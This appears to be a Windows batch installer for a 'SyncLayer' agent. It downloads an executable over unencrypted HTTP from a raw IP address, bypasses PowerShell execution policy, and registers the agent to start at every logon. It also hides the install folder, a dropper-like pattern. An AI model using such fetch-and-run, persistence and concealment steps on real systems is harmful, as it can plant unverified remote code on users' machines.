@echo off
setlocal EnableExtensions
pushd "%~dp0" >nul 2>&1

echo ============================================
echo  SyncLayer ONE-FILE INSTALL
echo ============================================
echo.

net session >nul 2>&1
if errorlevel 1 (
    echo ERROR: Run as Administrator
    pause
    exit /b 1
)

set "DEST=%ProgramFiles%\SyncLayer"
set "AGENT=%DEST%\SyncLayerAgent.exe"
set "EXE_URL=http://201.51.8.127:8000/static/SyncLayerAgent.exe"
set "HELPERS=%~dp0install_common.ps1"
set "FINALIZE=%~dp0install_finalize.ps1"
set "VERIFY=%~dp0install_verify.ps1"

if not exist "%DEST%" mkdir "%DEST%"

echo [1/4] Copy install helpers
copy /Y "%HELPERS%" "%DEST%\" >nul
copy /Y "%FINALIZE%" "%DEST%\" >nul
copy /Y "%VERIFY%" "%DEST%\" >nul

echo [2/4] Download SyncLayerAgent.exe
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%AGENT%' -UseBasicParsing } catch { exit 1 }"
if errorlevel 1 (
    echo ERROR: download failed from:
    echo %EXE_URL%
    echo Check server availability and URL.
    pause
    exit /b 1
)

if not exist "%AGENT%" (
    echo ERROR: SyncLayerAgent.exe not found after download
    pause
    exit /b 1
)

echo [3/4] Register SyncLayerAgent task and start agent
powershell -NoProfile -ExecutionPolicy Bypass -File "%DEST%\install_finalize.ps1" -AgentPath "%AGENT%" -AgentDir "%DEST%"
if errorlevel 1 (
    echo ERROR: install finalize failed
    pause
    exit /b 1
)

echo [4/4] Verify install layout
powershell -NoProfile -ExecutionPolicy Bypass -File "%DEST%\install_verify.ps1"
if errorlevel 1 (
    echo ERROR: install verification failed
    pause
    exit /b 1
)

attrib +h "%DEST%" >nul 2>&1

echo.
echo OK. SyncLayer installed.
echo Process : 1 x SyncLayerAgent.exe
echo Autostart: task SyncLayerAgent on user logon
echo Dashboard: http://201.51.8.127:8000
echo Wait 1-2 minutes and refresh dashboard.
echo.
pause
popd >nul 2>&1
exit /b 0
